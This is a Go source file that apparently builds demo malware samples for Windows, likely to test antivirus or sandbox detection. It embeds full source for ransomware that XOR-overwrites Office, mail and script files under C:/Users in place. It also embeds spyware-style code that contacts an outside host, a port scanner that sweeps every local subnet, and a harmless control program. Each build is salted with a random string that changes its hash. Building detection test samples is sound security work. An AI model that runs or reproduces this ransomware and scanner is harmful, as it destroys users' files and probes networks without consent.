package demomw

import (
	"bytes"
	"crypto/sha1"
	"encoding/hex"
	"fmt"
	"log"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"time"
)

func Generate(targetDir string) (paths []string) {
	rand.Seed(time.Now().UnixNano())
	for _, code := range []string{ransomwareCode, spywareCode, novirusCode, networkScanCode} {
		path, err := build(code, "windows", "amd64", targetDir)
		if err != nil {
			log.Printf("Generate: %v", err)
		}
		paths = append(paths, path)
	}
	return
}

func exe(goos string) string {
	if goos == "windows" {
		return ".exe"
	}
	return ""
}

var letters = []rune("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

func randString(length int) string {
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

func fileSHA1(filePath string) (string, error) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		return "", err
	}
	hash := sha1.New()
	hash.Write(data)
	return hex.EncodeToString(hash.Sum(nil)), nil
}

func extractLabel(code string) string {
	r := regexp.MustCompile(`^//([0-9A-Za-z]+)//`)
	s := r.FindStringSubmatch(code)
	if len(s) != 2 {
		return "unknown"
	}
	return s[1]
}

func build(code, goos, goarch, targetDir string) (string, error) {
	tempDir, err := os.MkdirTemp("", "demomw_*")
	if err != nil {
		return "", err
	}
	defer os.RemoveAll(tempDir)

	codePath := filepath.Join(tempDir, "main.go")
	err = os.WriteFile(codePath, []byte(code), 0644)
	if err != nil {
		return "", err
	}

	label := extractLabel(code)
	output := filepath.Join(tempDir, label+exe(goos))
	ldflags := fmt.Sprintf("-X 'main.Ballast=%s'", randString(16))
	command := []string{
		"build", "-o", output, "-ldflags", ldflags, codePath,
	}
	//log.Println("go", strings.Join(command, " "))
	cmd := exec.Command("go", command...)
	cmd.Env = os.Environ()
	cmd.Env = append(cmd.Env, "GOOS="+goos)
	cmd.Env = append(cmd.Env, "GOARCH="+goarch)
	var o bytes.Buffer
	cmd.Stdout = &o
	var e bytes.Buffer
	cmd.Stderr = &o
	err = cmd.Run()
	if err != nil {
		if o.Len() > 0 {
			err = fmt.Errorf("%s%w", o.String(), err)
		}
		if e.Len() > 0 {
			err = fmt.Errorf("%s%w", e.String(), err)
		}
		return "", err
	}
	sha1, err := fileSHA1(output)
	if err != nil {
		return "", err
	}
	newName := label + "_" + sha1 + exe(goos)
	targetPath := filepath.Join(targetDir, newName)
	err = os.Rename(output, targetPath)
	if err != nil {
		return "", fmt.Errorf("os.Rename to %s: %w", targetPath, err)
	}
	return targetPath, nil
}

var spywareCode = `//spyware//
package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

var Ballast = "1AASSSaaa"

func main() {
	fmt.Printf("Demo spyware (%s)\n", Ballast)
	url := "http://wrs21.winshipway.com/"
	fmt.Printf("Get: %s\n", url)
	resp, err := http.Get(url)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	html, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Printf("Got\n%s\n", html)
}
`

var ransomwareCode = `//ransomware//
package main

import (
	"fmt"
	"io"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

var Ballast = "1AASSSaaa"

var targets = []string{
	".doc",
	".docx",
	".ppt",
	".pptx",
	".xls",
	".xlsx",
	".vbs",
	".pst",
}

var secret = "secret password"

func encrypt(fileName string, secret string) error {
	stat, err := os.Stat(fileName)
	if err != nil {
		return err
	}
	size := stat.Size()
	f, err := os.OpenFile(fileName, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer f.Close()
	fmt.Printf("Encrypt %s: Start\n", fileName)
	fmt.Printf("File size = %d\n", size)
	const bufSize = 8 * 1024
	buffer := make([]byte, bufSize)
	secretIndex := 0
	for {
		n, err := f.Read(buffer)
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
		for i := 0; i < n; i++ {
			buffer[i] ^= secret[secretIndex]
			secretIndex++
			if secretIndex == len(secret) {
				secretIndex = 0
			}
		}
		f.Seek(-int64(n), os.SEEK_CUR)
		_, err = f.Write(buffer[:n])
		if err != nil {
			return err
		}
	}

	fmt.Printf("Encrypt %s: Done\n", fileName)
	return nil
}

func isTarget(name string) bool {
	ext := filepath.Ext(name)
	for _, t := range targets {
		if strings.EqualFold(t, ext) {
			return true
		}
	}
	return false
}

func encryptDir(dir string) error {
	count := 0
	fmt.Printf("Start encryption in %s\n", dir)
	err := filepath.Walk(dir, func(path string, info fs.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		if !isTarget(path) {
			return nil
		}
		err = encrypt(path, secret)
		if err != nil {
			return fmt.Errorf("%v: %w", path, err)
		}
		count++
		return nil
	})
	fmt.Printf("Encrypted %d files\n", count)
	return err
}

func main() {
	fmt.Printf("Demo ransomware (%s)\n", Ballast)
	dir := "C:/Users"
	err := encryptDir(dir)
	if err != nil {
		fmt.Printf("%s: %v\n", dir, err)
	}
}
`

var novirusCode = `//novirus//
package main

func main() {
	println("This is innocent application")
}
`

var networkScanCode = `//networkscan//
package main

import (
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"time"
)

var (
	maxGoRoutines = 20000
	timeout       = 100 * time.Millisecond
	startPort     = 1
	endPort       = 1024
)

func iterateInerfacesAddresses(n chan *net.IPNet) error {
	ifaces, err := net.Interfaces()
	if err != nil {
		return err
	}
	fmt.Printf("Found %d interfaces(s)\n", len(ifaces))
	for _, i := range ifaces {
		addrs, err := i.Addrs()
		if err != nil {
			return err
		}
		for _, addr := range addrs {
			ipv4Addr, ipv4Net, err := net.ParseCIDR(addr.String())
			if err != nil {
				return err
			}
			if ipv4Addr.To4() == nil {
				continue
			}
			if ipv4Addr.IsLoopback() {
				continue
			}
			n <- ipv4Net
		}
	}
	close(n)
	return err
}

func iterateAddresses(ipChan chan net.IP) {
	ipNetChan := make(chan *net.IPNet)
	go func() {
		err := iterateInerfacesAddresses(ipNetChan)
		if err != nil {
			fmt.Println(err)
		}
	}()
	for n := range ipNetChan {
		fmt.Printf("Scan %v network\n", n)
		// https://stackoverflow.com/questions/60540465/how-to-list-all-ips-in-a-network
		mask := binary.BigEndian.Uint32(n.Mask)
		start := binary.BigEndian.Uint32(n.IP)
		finish := (start & mask) | (mask ^ 0xffffffff)
		for i := start + 1; i < finish; i++ {
			ip := make(net.IP, 4)
			binary.BigEndian.PutUint32(ip, i)
			ipChan <- ip
		}
	}
	close(ipChan)
}

func iterateAddressWithPort(addr chan string) {
	ipChan := make(chan net.IP)
	go func() {
		iterateAddresses(ipChan)
	}()
	for ip := range ipChan {
		for p := startPort; p <= endPort; p++ {
			addr <- ip.String() + ":" + strconv.Itoa(p)
		}
	}
	close(addr)
}

func scan() {
	addrChan := make(chan string)
	go func() {
		iterateAddressWithPort(addrChan)
	}()
	limit := make(chan struct{}, maxGoRoutines)
	for addr := range addrChan {
		limit <- struct{}{}
		go func(addr string) {
			scanPort(addr)
			<-limit
		}(addr)
	}
}

func scanPort(addr string) {
	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return
	}
	defer conn.Close()
	fmt.Println(addr)
}

func main() {
	fmt.Println("Scan local network")
	scan()
	fmt.Println("Done")
}
`
